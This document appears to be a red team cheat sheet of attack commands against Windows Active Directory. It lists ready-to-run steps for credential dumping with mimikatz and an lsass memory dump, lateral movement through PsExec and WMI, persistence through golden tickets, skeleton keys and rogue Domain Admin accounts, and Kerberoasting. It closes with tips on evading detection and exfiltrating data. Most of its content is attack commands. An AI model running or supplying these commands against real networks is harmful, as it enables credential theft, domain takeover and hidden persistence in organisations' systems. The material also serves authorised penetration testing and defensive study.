# Active Directory Cheat Sheet for Red Team Operators

This cheat sheet focuses on real-world TTPs used during internal red team ops against Active Directory environments. Includes PowerShell, command-line, and tool-assisted approaches for **enumeration**, **privilege escalation**, **persistence**, **lateral movement**, and **AD abuse**.

---

## 🔍 Recon & Enumeration

### Basic Environment Info (from domain-joined host)

```powershell
whoami /groups
set
systeminfo
echo %USERDNSDOMAIN%
```

### Get Domain Info

```powershell
nltest /dclist:<domain>
nltest /domain_trusts
echo %LOGONSERVER%
```

### List Domain Controllers

```powershell
Get-ADDomainController -Filter * | Select-Object HostName, IPv4Address
```

### Net Commands

```powershell
net group "Domain Admins" /domain
net user <user> /domain
net group /domain
net localgroup administrators
```

### Powerview (PowerShell-based AD enumeration)

```powershell
Import-Module .PowerView.ps1

Get-NetDomain
Get-NetUser
Get-NetComputer
Get-NetGroup -GroupName "Domain Admins"
Find-LocalAdminAccess
```

---

## 🧠 User Hunting

### Find where users are logged in

```powershell
Invoke-UserHunter
Invoke-StealthUserHunter
```

### Find local admin rights

```powershell
Find-LocalAdminAccess
```

---

## 🔑 Credential Access

### Dumping Hashes with mimikatz

```powershell
privilege::debug
lsadump::lsa
lsadump::sam
sekurlsa::logonpasswords
```

### Extract cached logon data

```powershell
reg query "HKLMSECURITYCache"
```

### Dump credentials from memory (Windows)

```powershell
procdump.exe -ma lsass.exe lsass.dmp
```
Then analyze with mimikatz or pypykatz.

---

## 🧱 Lateral Movement

### PsExec (needs admin)

```bash
psexec.exe target cmd.exe
```

### WMI Execution

```powershell
wmic /node:target process call create "cmd.exe /c whoami"
```

### PowerShell Remoting

```powershell
Enter-PSSession -ComputerName target -Credential <user>
```

### RDP (classic)

```bash
mstsc /v:target
```

---

## 🪝 Persistence

### Add user to Domain Admins (if DA)

```powershell
net group "Domain Admins" newuser /add /domain
```

### Golden Ticket

```powershell
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain SID> /krbtgt:<hash> /ptt
```

### Skeleton Key (inject into LSASS)

```powershell
misc::skeleton
```

---

## 🧬 Active Directory Object Abuse

### Kerberoasting

```powershell
Invoke-Kerberoast
```

### AS-REP Roasting (no preauth required)

```powershell
Get-ASREPHash -User <targetUser>
```

### ACL Abuse: Add user to ACL of target object

```powershell
Add-ADPermission -Identity <target> -User <attacker> -ExtendedRights "Reset Password"
```

---

## 🔓 Privilege Escalation Paths

### Group Membership Misconfigs

- Domain Users in local `Administrators`
- Authenticated Users with `GenericAll` on OUs

Use: **BloodHound** or `SharpHound`

---

## 🩸 Tools Reference

- **BloodHound** – Graph-based AD attack path mapper
- **SharpHound** – Data collector for BloodHound
- **Rubeus** – Kerberos abuse and ticket manipulation
- **PowerView** – AD recon via PowerShell
- **Mimikatz** – Credential dumping, ticket creation
- **Impacket** – Python SMB/RPC tools (wmiexec, secretsdump, etc.)
- **Seatbelt** – Local system enumeration

---

## 🧯 Defensive Notes (for OPSEC-aware operations)

- Avoid touching `Domain Admins` unless necessary
- Avoid Kerberos ticket injection unless needed (tripwire logs)
- Use `stealth` options in tools where available
- Rotate user-agent and tool paths if using PowerShell

---

## 🔚 Summary Tips

- Enumerate first, escalate later
- Always check for path to DA *without* needing hashes (ACLs, delegation, SPNs)
- Use BloodHound + SharpHound early
- Rotate and exfil using safe protocols (SMB > HTTP for internal)

---


